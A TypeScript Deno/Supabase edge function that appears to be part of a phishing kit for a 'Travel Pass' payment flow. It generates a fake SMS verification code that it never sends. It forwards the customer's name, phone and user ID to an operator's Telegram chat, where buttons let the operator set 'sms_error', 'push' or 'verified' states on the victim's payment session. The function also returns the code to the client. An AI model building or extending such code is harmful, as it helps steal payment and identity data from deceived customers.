import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramSettings {
  bot_token: string;
  info_chat_id: string;
  form_chat_id: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? '',
    );

    const { userId, phone, customerName, testType } = await req.json();
    console.log('SMS send request:', { userId, phone, customerName, testType });

    // Get telegram settings
    const { data: settings } = await supabaseClient
      .from('settings')
      .select('value')
      .eq('key', 'telegram')
      .single();

    if (!settings) {
      throw new Error('No telegram settings found');
    }

    const telegramSettings = settings.value as TelegramSettings;

    // Generate a 6-digit SMS code
    const smsCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Store SMS code in payment session for verification
    const { error: updateError } = await supabaseClient
      .from('payment_sessions')
      .update({
        admin_response: testType === 'error' ? 'sms_error' : 'sms_sent'
      })
      .eq('user_id', userId);

    if (updateError) {
      console.error('Error updating payment session:', updateError);
    }

    // Send SMS notification to Telegram
    let messageText;
    let buttons;

    if (testType === 'error') {
      messageText = `❌ SMS SENDING FAILED ❌

🆔 User ID: ${userId}
👤 Customer: ${customerName}
📱 Phone: ${phone}

⚠️ SMS delivery failed. Please try alternative verification method.`;

      buttons = [
        [{
          text: "🔔 Send Push Instead",
          callback_data: `sms_retry_${userId}_push`
        }],
        [{
          text: "↩️ Back to Payment",
          callback_data: `sms_retry_${userId}_back`
        }]
      ];
    } else {
      messageText = `📱 SMS VERIFICATION CODE SENT 📱

🆔 User ID: ${userId}
👤 Customer: ${customerName}
📱 Phone: ${phone}

🔐 Verification Code: ${smsCode}
⏱️ Valid for: 5 minutes

SMS Message: "Your verification code for Travel Pass: ${smsCode}. Do not share this code."`;

      buttons = [
        [{
          text: "✅ Code Verified",
          callback_data: `sms_verify_${userId}_success`
        }, {
          text: "❌ Wrong Code Entered",
          callback_data: `sms_verify_${userId}_error`
        }],
        [{
          text: "📱 Resend SMS",
          callback_data: `sms_verify_${userId}_resend`
        }]
      ];
    }

    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramSettings.form_chat_id,
        text: messageText,
        reply_markup: {
          inline_keyboard: buttons
        }
      })
    });

    const telegramResult = await telegramResponse.json();
    
    if (!telegramResult.ok) {
      console.error('Failed to send telegram message:', telegramResult);
      throw new Error('Failed to send SMS notification');
    }

    console.log('SMS notification sent successfully:', telegramResult);

    return new Response(JSON.stringify({
      success: true,
      smsCode: testType === 'error' ? null : smsCode,
      message: testType === 'error' ? 'SMS sending failed' : 'SMS sent successfully'
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('Error in send-sms function:', error);
    return new Response(JSON.stringify({
      success: false,
      error: error.message
    }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});